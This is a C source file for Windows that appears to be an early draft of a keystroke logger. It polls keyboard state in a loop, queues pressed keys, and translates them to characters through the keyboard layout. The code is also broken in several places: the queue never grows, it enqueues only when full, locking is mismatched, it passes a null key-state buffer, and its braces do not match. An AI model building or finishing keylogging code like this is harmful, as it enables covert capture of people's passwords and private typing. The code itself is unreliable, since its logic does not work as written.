#include <WinUser.h>
#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include "keyboard_ini.h" 
#include <synchapi.h>




 
// Data structure to store keypresses 

typedef struct {

    int vKey;
   
} KeyPress;  

typedef struct {

    KeyPress* elements;
    int front;
    int rear;
    int size;
    int capacity;

    CRITICAL_SECTION queueCriticalSection; // synchronize the queue 

    HKL hkl; 

} ExpandableQueue;

void initQueue(ExpandableQueue* queue, int initialCapacity, HKL hkl) {
    
    //here we can play by type of processors & memory( more advanced)
    queue->elements = (KeyPress*)malloc(initialCapacity * sizeof(KeyPress));

    if (queue->elements == NULL) {

	   fprintf(stderr, "failed");
	   exit(1); // argument is 1 to exit IF there's an error 

    }
    queue->front = 0;
    queue->rear = 0;
    queue->size = 0;
    queue->capacity = initialCapacity; 
    queue->hkl = hkl;
    InitializeCriticalSection(&queue->queueCriticalSection); // INITIALIZE THE CRITICAL SECTION 

}

void Enter_Queue(ExpandableQueue* queue, KeyPress item) {
    
    if (queue->size == queue->capacity) {
	   // comparing the queue capacity with number of elements and each time the size reach the capacity we re allocate memory x2 ( we may diminish it ** I will search on this subject ** )
	  queue->elements = (KeyPress*)realloc(queue->elements, queue->capacity *sizeof(KeyPress));
	  if (queue->elements == NULL) {
		 
		 fprintf(stderr, "Failed");
		 exit(1);
	  }

	  queue->elements[queue->rear] = item; 
	  queue->rear = (queue->rear + 1) % queue->capacity;
	  queue->size++;

	  LeaveCriticalSection(&queue->queueCriticalSection);


    }
}

// Get current keyboard_layout to obtain a more appropriate state depending on
// keyboard type and settings. this will convert the virtual key code to unicode , since most characters do not go above 2 bytes( except japanese which sometimes are 4 bytes)

VOID keyboard_layout(BYTE vKey, HKL hkl) {

    WCHAR charBuffer[2];


    int result = ToUnicodeEx(vKey, 0, GetKeyboardState(NULL), charBuffer, 2, 0, hkl);

    if (result > 0) {

	   printf("key with virtual-key code 0x%X pressed: %lc\n", vKey, charBuffer[0]);
    }

};

// Get current state of keyboard  
VOID *keyboard_state_queue(void *queue_arg ) {
   
    ExpandableQueue* queue = (ExpandableQueue*)queue_arg;
    HKL hkl = queue->hkl; 
    BYTE keyState[256]; //buffer for characters we put 256 because theres only 256 possible characters

    while (1) {

	   if (GetKeyboardState(keyState)) {

		  // keycodes for english anyways goes from 0x01 to 0xFF 
		  for (int vKey = 0x01; vKey <= 0xFF; vKey++) {

			 if (keyState[vKey] & 0x80) {
				
				KeyPress item; 
				item.vKey = vKey; 
				
				Enter_Queue(queue, item);
		
			 }
			 else {

				printf("Failed");
				
			 }
			 sleep(5); 
	  }
    }
	   return NULL; 
}; 



// NEXT STEP IS ERROR HANDLING, TIME MANIPULATION VIA OS , DIFFERENT KEYBOARDS
